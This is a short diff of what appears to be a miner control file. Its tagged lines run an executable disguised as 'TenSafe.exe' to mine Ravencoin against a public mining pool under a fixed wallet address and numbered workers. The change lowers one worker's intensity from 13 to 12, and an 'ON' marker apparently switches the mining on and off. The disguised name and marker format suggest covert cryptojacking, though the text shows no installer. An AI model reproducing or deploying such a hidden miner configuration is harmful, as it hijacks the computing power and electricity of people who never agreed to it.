@@ -14,7 +14,7 @@ A3A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2F
 A4A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1013@pplns -i 13 -p x--A4A
 A5A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1014@pplns -i 14 -p x--A5A
 A6A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.1015@pplns -i 15 -p x--A6A
-A7A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.cf13@pplns -i 13 -p x--A7A
+A7A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.cf13@pplns -i 12 -p x--A7A
 A9A--ON--A9A
 ------------------------------------------------------------------------------------------------------------------------------------
 A0A--\TenSafe.exe--A0A
